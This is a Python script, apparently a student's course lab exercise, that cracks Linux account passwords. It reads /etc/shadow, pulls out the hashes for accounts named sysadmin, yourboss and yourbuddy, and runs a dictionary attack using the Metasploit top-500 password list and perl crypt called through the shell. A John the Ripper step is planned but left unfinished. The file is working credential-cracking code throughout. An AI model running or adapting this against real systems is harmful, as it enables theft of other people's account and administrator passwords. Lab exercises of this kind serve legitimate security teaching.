#!/usr/bin/python
###########################################################
#Sean Sikorski                                 oct 20, 2018
#funandgames.py                                 compSci3600
###########################################################
# Output bosses password, your buddy's password and 
#   sys admin passwords using different methods.
#   first: dictionary attack
#   second: using a hack aid 
#   third: coder's choice
###########################################################
# $ python3 funandgames.py >myout.txt
###########################################################
import subprocess, os, string

#Class for each user to hold onto their shadow file stuff
class user:
    def __init__(self, line):
        temp = line.split('$')
        self.type = temp[1]
        self.hash = temp[2]
        self.code = temp[3]

#encrypts specified word using users encrypt type and seed
#   then proceeds to cut it down to the part we are interested in 
#   the encrypted word.
def getCode(word, user):
    tempstring = "perl -e \'print crypt(\"" + word + "\", \"\$" + user.type + "\$" + user.hash + "\$\") . \"\"\'"
    temp = subprocess.run(tempstring, stdout=subprocess.PIPE, shell=True)
    temp = str(temp.stdout).split('$')
    #if an error uccurs in perl this will help avoid crashes
    if len(temp) < 3:
        temp = "NULL"
    else:
        temp = temp[3]
    temp = temp[:-1]
    return temp

#not really needed anymore but will remove most unrecognized symbols and crash tokens
#   like $ 
def fixWord(word):
    printable = string.ascii_letters + string.digits + string.punctuation
    temp = ''
    for char in word:
        if char in printable:
            temp = temp + char
    
    return temp

#goes through each word of top 500 passwords to encrypt it then compare it to the encrypted
#   users password. if they match then the word encrypted is the password
def dictattack(user):
    filepath = os.path.abspath('/usr/share/wordlists/metasploit/burnett_top_500.txt')
    comPass = open(filepath, "r")
    password = "password not found"
    for word in comPass:
        word = word.strip()
        if "!comment" not in word:
            word = fixWord(word)
            temp = getCode(word, user)
            if temp == user.code:
                password = word
                break
    comPass.close()
    return password 


def main():
    #grab and open shadowfile
    filepath = os.path.abspath('/etc/shadow')
    shadow = open(filepath, "r")

    #walk through shadow collecting the appropriate user passwords we want
    for line in shadow:
        if "sysadmin" in line:
            sysadmin = line
        elif "yourboss" in line:
            boss = line
        elif "tempworker" in line:
            tempworker = line
        elif "yourbuddy" in line:
            buddy = line

    #break up the full user shadow line into type, seed, and encrypted password
    sysadmin = user(sysadmin.split(':')[1])
    boss = user(boss.split(':')[1])
    tempworker = user(tempworker.split(':')[1])
    buddy = user(buddy.split(':')[1])

    #close shadow
    shadow.close()

    #use dictionary attack to get boss and admin passwords
    bossPass = dictattack(boss)
    adminPass = dictattack(sysadmin)

    #eventually get buddy password with john cracker
    buddyPass = "not found"

    #keeping example for later use
    #test = subprocess.run("perl -e \'print crypt(\"money\", \"\$6\$5H0QpwprRiJqr19Y\$\") . \"\n\"\'", stdout=subprocess.PIPE, shell=True)

    #print passwords in order specified
    print(bossPass)
    print(buddyPass)
    print(adminPass)


if __name__ == '__main__':
    main()